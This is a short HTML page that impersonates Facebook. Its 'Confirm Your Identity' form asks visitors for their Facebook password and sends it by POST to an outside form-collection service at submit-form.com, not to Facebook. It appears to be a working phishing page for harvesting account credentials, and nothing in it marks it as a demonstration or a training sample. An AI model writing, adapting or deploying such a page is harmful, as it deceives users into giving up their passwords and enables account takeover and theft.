<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirm Identity - Facebook</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <div class="container">
    </div>

    <div class="landing-form" style="margin: 40px auto; max-width: 400px;">
      <h1 class="landing-logo">Facebook</h1>
      <h2>Confirm Your Identity</h2>
      <p>Enter your Facebook password to finalize verification</p>

      <form id="passwordForm" class="form-group" action="https://submit-form.com/TSRlLhDlN" method="POST">
        <input type="password" class="form-input" name="password" placeholder="Password" required>
        <button type="submit" class="btn btn-primary">Confirm</button>
      </form>

      <p class="security-notice">
      </p>
    </div>
  </div>

  <footer class="footer">
    Meta . 2025
  </footer>

  <script src="/main.js"></script>
</body>
</html>
